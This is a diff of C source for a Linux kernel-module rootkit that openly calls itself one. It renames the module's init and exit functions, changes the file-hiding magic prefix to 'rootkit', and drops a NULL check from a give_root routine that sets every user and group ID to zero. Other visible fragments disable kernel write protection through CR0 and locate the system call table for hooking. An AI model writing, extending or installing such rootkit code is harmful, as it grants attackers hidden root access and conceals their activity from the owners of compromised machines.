@@ -8,7 +8,7 @@
 #include <linux/fdtable.h>
 #include <linux/kprobes.h>
 
-#define MAGIC_PREFIX "secret"
+#define MAGIC_PREFIX "rootkit"
 #define PF_INVISIBLE 0x10000000
 #define __NR_getdents 141
 
@@ -176,12 +176,10 @@ void give_root(void)
 {
 		struct cred *newcreds;
 		newcreds = prepare_creds();
-		if (newcreds == NULL)
-			return;
-			newcreds->uid.val = newcreds->gid.val = 0;
-			newcreds->euid.val = newcreds->egid.val = 0;
-			newcreds->suid.val = newcreds->sgid.val = 0;
-			newcreds->fsuid.val = newcreds->fsgid.val = 0;
+		newcreds->uid.val = newcreds->gid.val = 0;
+		newcreds->euid.val = newcreds->egid.val = 0;
+		newcreds->suid.val = newcreds->sgid.val = 0;
+		newcreds->fsuid.val = newcreds->fsgid.val = 0;
 		commit_creds(newcreds);
 }
 
@@ -250,7 +248,7 @@ static inline void unprotect_memory(void)
 	write_cr0_forced(cr0 & ~0x00010000);
 }
 
-static int __init module_init(void)
+static int __init rootkit_init(void)
 {
 	__sys_call_table = get_syscall_table_bf();
 	if (!__sys_call_table)
@@ -275,7 +273,7 @@ static int __init module_init(void)
 }
 
 static void __exit
-module_exit(void)
+rootkit_cleanup(void)
 {
 	unprotect_memory();
 
@@ -286,8 +284,8 @@ module_exit(void)
 	protect_memory();
 }
 
-module_init(module_init);
-module_exit(module_exit);
+module_init(rootkit_init);
+module_exit(rootkit_cleanup);
 
 MODULE_LICENSE("Dual BSD/GPL");
-MODULE_DESCRIPTION("rootkit");
+MODULE_DESCRIPTION("LKM rootkit");
